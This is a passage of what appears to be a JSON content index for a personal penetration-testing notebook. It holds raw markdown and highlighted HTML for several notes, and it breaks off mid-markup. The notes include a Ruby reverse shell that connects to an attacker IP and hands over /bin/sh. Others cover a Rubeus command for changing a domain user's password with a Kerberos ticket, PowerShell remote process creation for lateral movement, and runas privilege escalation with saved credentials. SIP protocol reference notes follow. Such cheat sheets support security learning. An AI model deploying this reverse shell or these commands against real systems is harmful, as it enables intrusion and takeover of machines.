style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Rubeus.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; changepw &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ticket:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TICKET_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                    /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;new:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;NEW_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                    /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;dc:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;DC_IP_ADDRESS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                    /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;targetuser:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\\&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USER&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Ruby":{"slug":"spells/Ruby","filePath":"spells/Ruby.md","title":"Ruby","links":["spells/netcat","spells/socat"],"tags":["Language/Ruby","AttackCycle/Exploitation","Application/netcat","Application/socat"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_ReverseShells.\n\n\n\nA simple reverse shell:\nrequire &quot;socket&quot;\n \nattacker_ip = &quot;10.0.0.1&quot;\nattacker_port = 1234\n \nf = TCPSocket.open(attacker_ip, attacker_port).to_i\n \nexec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;, f, f, f)\nCatch it with netcat or socat.","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_ReverseShells#L20&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_ReverseShells&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;A simple reverse shell:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;ruby&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;ruby&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;require&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;socket&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;attacker_ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; = &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;10.0.0.1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;attacker_port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; = &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1234&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; = &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;TCPSocket&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;open&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;attacker_ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; attacker_port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;).&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;to_i&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; sprintf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/sh -i &amp;#x3C;&amp;#x26;%d &gt;&amp;#x26;%d 2&gt;&amp;#x26;%d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Catch it with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/socat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/socat&quot;&gt;socat&lt;/a&gt;.&lt;/p&gt;"},"spells/Run-a-remote-Windows-command-using-PowerShell":{"slug":"spells/Run-a-remote-Windows-command-using-PowerShell","filePath":"spells/Run a remote Windows command using PowerShell.md","title":"Run a remote Windows command using PowerShell","links":[],"tags":["Application/PowerShell","OS/Windows","AttackCycle/LateralMovement","HowTo"],"content":"Invoke-CimMethod -CimSession $SESSION_OBJECT `\n                 -ClassName Win32_Process `\n                 -MethodName Create `\n                 -Arguments @{\n                      CommandLine = &quot;$SOME_COMMAND&quot;\n                  }","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Invoke-CimMethod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;CimSession &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SESSION_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ClassName Win32_Process &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;MethodName Create &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                 -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Arguments &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;                      CommandLine&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SOME_COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                  }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Run-commands-directly-with-PowerShell":{"slug":"spells/Run-commands-directly-with-PowerShell","filePath":"spells/Run commands directly with PowerShell.md","title":"Run commands directly with PowerShell","links":[],"tags":["Application/PowerShell","HowTo"],"content":"powershell -c &quot;$COMMAND&quot;","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;powershell &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;c &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/RunAs":{"slug":"spells/RunAs","filePath":"spells/RunAs.md","title":"RunAs","links":["spells/sudo","spells/whoami"],"tags":["Application/RunAs","OS/Windows","Application/sudo","Application/cmdkey","Application/whoami"],"content":"The Windows runas command is more-or-less the equivalent of sudo on *NIX systems. Usage is similar.\nrunas /user:$USERNAME $EXECUTABLE\n$USERNAME may also be specified as $DOMAIN\\$USERNAME for domain-joined machines.\n$EXECUTABLE is treated normally (as if not prefixed by the runas command), so a full or relative path is only necessary when it’s not already in the Windows path.\nIf credentials are saved for a particular user (use cmdkey /list to check), then the /savecred flag will apply them automatically!\n\n\n                  \n                  Important\n                  \n                \n\n\nWhen using runas to start a reverse shell, whoami will always return the user who called the runas command, even if the shell is running as under a different user’s privileges.  Thus, elevating privileges using runas is a blind attack… You won’t know if the privilege escalation actually worked until you try a command that requires more privileges!\n\n\n","richContent":"&lt;p&gt;The Windows &lt;a href=&quot;https://www.shellhacks.com/windows-run-as-different-user/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;runas&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; command is more-or-less the equivalent of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt; on *NIX systems. &lt;a href=&quot;https://www.windows-commandline.com/windows-runas-command-prompt/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Usage is similar.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;runas &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;user:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;EXECUTABLE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;&lt;code&gt;$USERNAME&lt;/code&gt; may also be specified as &lt;code&gt;$DOMAIN\\$USERNAME&lt;/code&gt; for domain-joined machines.&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;$EXECUTABLE&lt;/code&gt; is treated normally (as if not prefixed by the runas command), so a full or relative path is only necessary when it’s not already in the Windows path.&lt;/p&gt;\n&lt;p&gt;If credentials are saved for a particular user (use &lt;code&gt;cmdkey /list&lt;/code&gt; to check), then the &lt;code&gt;/savecred&lt;/code&gt; flag will apply them automatically!&lt;/p&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;When using runas to start a reverse shell, &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/whoami&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/whoami&quot;&gt;whoami&lt;/a&gt; will always return the user who called the runas command, &lt;em&gt;even if the shell is running as under a different user’s privileges&lt;/em&gt;.  Thus, elevating privileges using runas is a blind attack… You won’t know if the privilege escalation &lt;em&gt;actually&lt;/em&gt; worked until you try a command that requires more privileges!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/SIP":{"slug":"spells/SIP","filePath":"spells/SIP.md","title":"SIP","links":["spells/TCP","spells/UDP","spells/HTTP","spells/Uniform-resource-locators","spells/SIP"],"tags":["Protocol/SIP","Protocol/TCP","Protocol/UDP","Protocol/HTTP","Standard/URI"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_VOIP.txt.\n\n\n\nSIP usually uses ports 5060 TCP or UDP for unencrypted signaling or 5061 for encrypted transportation using TLS.\nSIP is an ASCII based protocol which has some similar elements like in the HTTP protocol by using a request/response model. Much like an HTTP request from a browser a SIP client request is made using a SIP URI a user agent and a method/request. SIP uses e-mail like addresses format:\n\nsip:205@192.168.1.100\nsip:username@pbx.com\nsip:205@192.168.1.100:5060\netc.\n\nSIP requests/methods\n\nINVITE — Used to invite and account to participate in a call session.\nACK — Acknowledge an INVITE request.\nCANCEL — Cancel a pending request.\nREGISTER — Register user with a SIP server.\nOPTIONS — Lists information about the capabilities of a caller.\nBYE — Terminates a session between two users in a call.\nREFER — Indicates that the recipient(identified by the Request URI) should contact a third party using the contact information provided in the request.\nSUBSCRIBE — The SUBSCRIBE method is used to request current state and state updates from a remote node.\nNOTIFY — The NOTIFY method is used to notify a SIP node that an event which has been requested by an earlier SUBSCRIBE method has occurred.\n\nExample SIP INVITE request\nINVITE sip:201@192.168.1.104 SIP/2.0\nVia: SIP/2.0/UDP 192.168.1.102;rport;branch=z9hG4bKvbxaoqar\nMax-Forwards: 70 \n \nTo: \nFrom: &quot;NightRanger&quot; ;tag=eihgg\nCall-ID: hfxsabthoymshub@backtrack\nCSeq: 649 INVITE\nContact: \nContent-Type: application/sdp \n \nAllow: INVITE,ACK,BYE,CANCEL,OPTIONS,PRACK,REFER,NOTIFY,SUBSCRIBE,INFO,MESSAGE\nSupported: replaces,norefersub,100rel\nUser-Agent: Twinkle/1.2 \n \nContent-Length: 310\nSIP responses\n\n1xx — Informational responses.\n2xx — Successful responses: The action was successfully received, understood, and accepted.\n3xx — Redirection responses.\n4xx — Request failure responses: The request contains bad syntax or cannot be fulfilled at the server.\n5xx — Server failure responses: The server failed to fulfill an apparently valid request.\n6xx — Global failure responses: The request cannot be fulfilled at any server.\n\nExample SIP call\n\nThe calling phone sends an invite.\nThe called phone sends back a response of 100 (Trying).\nThe called phone then starts to ring and sends a response of 180 (Ringing).\nWhen the caller picks up the phone the called phone sends a response of 200 (OK).\nThe calling phone sends an ACK response.\nConversation begins via RTP.\nWhen the caller hangs up the phone a BYE request is sent.\nThe calling phone responds with 200 (OK).\n","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_VOIP.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_VOIP.txt&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;SIP usually uses ports 5060 &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; for unencrypted signaling or 5061 for encrypted transportation using TLS.&lt;/p&gt;\n&lt;p&gt;SIP is an ASCII based protocol which has some similar elements like in the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; protocol by using a request/response model. Much like an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; request from a browser a SIP client request is made using a SIP &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Uniform-resource-locators&quot;&gt;URI&lt;/a&gt; a user agent and a method/request. SIP uses e-mail like addresses format:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;sip:205@192.168.1.100&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;sip:username@pbx.com&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;sip:205@192.168.1.100:5060&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;etc.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;sip-requestsmethods&quot;&gt;SIP requests/methods&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#sip-requestsmethods&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;INVITE — Used to invite and account to participate in a call session.&lt;/li&gt;\n&lt;li&gt;ACK — Acknowledge an INVITE request.&lt;/li&gt;\n&lt;li&gt;CANCEL — Cancel a pending request.&lt;/li&gt;\n&lt;li&gt;REGISTER — Register user with a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SIP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SIP&quot;&gt;SIP&lt;/a&gt; server.&lt;/li&gt;\n&lt;li&gt;OPTIONS — Lists information about the capabilities of a caller.&lt;/li&gt;\n&lt;li&gt;BYE — Terminates a session between two users in a call.&lt;/li&gt;\n&lt;li&gt;REFER — Indicates that the recipient(identified by the Request &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Uniform-resource-locators&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Uniform-resource-locators&quot;&gt;URI&lt;/a&gt;) should contact a third party using the contact information provided in the request.&lt;/li&gt;\n&lt;li&gt;SUBSCRIBE — The SUBSCRIBE method is used to request current state and state updates from a remote node.&lt;/li&gt;\n&lt;li&gt;NOTIFY — The NOTIFY method is used to notify a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SIP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SIP&quot;&gt;SIP&lt;/a&gt; node that an event which has been requested by an earlier SUBSCRIBE method has occurred.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=&quot;example-sip-invite-request&quot;&gt;Example SIP INVITE request&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#example-sip-invite-request&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; 